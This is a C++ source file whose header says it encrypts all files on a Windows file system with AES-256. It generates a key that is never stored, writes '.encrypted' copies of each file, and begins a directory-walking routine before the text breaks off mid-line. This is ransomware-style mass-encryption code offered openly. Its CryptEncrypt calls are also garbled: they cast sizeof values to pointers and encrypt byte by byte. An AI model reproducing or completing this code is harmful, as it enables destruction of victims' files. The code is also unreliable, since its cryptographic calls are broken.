//Lennart Labahn
//Dec 8th 2022
// Will encrypt all files in a Windows File System using the AES-256 Encyption

#include <iostream>
#include <string>
#include <Windows.h>
#include <wincrypt.h>

using namespace std;

// Function to encrypt a file using AES 256-bit encryption
void encryptFile(const string& fileName)
{
    // Open the file for reading in binary mode
    ifstream file(fileName, ios::binary);

    // If the file couldn't be opened, print an error message and return
    if (!file)
    {
        cerr << "Error: Failed to open file for encryption: " << fileName << endl;
        return;
    }

    // Create a new file with the same name but with ".encrypted" appended to it
    string encryptedFileName = fileName + ".encrypted";
    ofstream encryptedFile(encryptedFileName, ios::binary);

    // If the file couldn't be created, print an error message and return
    if (!encryptedFile)
    {
        cerr << "Error: Failed to create encrypted file: " << encryptedFileName << endl;
        return;
    }

    // Initialize the AES encryption algorithm
    HCRYPTPROV hCryptProv;
    if (!CryptAcquireContext(&hCryptProv, NULL, NULL, PROV_RSA_AES, 0))
    {
        cerr << "Error: CryptAcquireContext failed" << endl;
        return;
    }

    HCRYPTKEY hKey;
    if (!CryptGenKey(hCryptProv, CALG_AES_256, CRYPT_EXPORTABLE, &hKey))
    {
        cerr << "Error: CryptGenKey failed" << endl;
        CryptReleaseContext(hCryptProv, 0);
        return;
    }

    // Read each byte from the file and encrypt it using AES 256-bit encryption
    char byte;
    while (file.get(byte))
    {
        // Encrypt the byte using AES 256-bit encryption
        if (!CryptEncrypt(hKey, 0, TRUE, 0, (BYTE*)&byte, (DWORD*)sizeof(byte), (DWORD*)sizeof(byte)))
        {
            cerr << "Error: CryptEncrypt failed" << endl;
            CryptDestroyKey(hKey);
            CryptReleaseContext(hCryptProv, 0);
            return;
        }

        // Write the encrypted byte to the encrypted file
        encryptedFile.put(byte);
    }

    // Clean up the AES encryption resources
    CryptDestroyKey(hKey);
    CryptReleaseContext(hCryptProv, 0);

    // Close both files
    file.close();
    encryptedFile.close();
}

// Function to encrypt all files in a directory
void encryptDirectory(const string& directory)
{
    // Use the Windows API to get a list of all files in the directory
    WIN32_FIND_DATA findData;
    HANDLE hFind = FindFirstFile((directory + "\\*").c_str(), &findData);

    // Check if the directory could be opened
    if (hFind == INVALID_HANDLE_VALUE)
    {
        cerr << "Error:

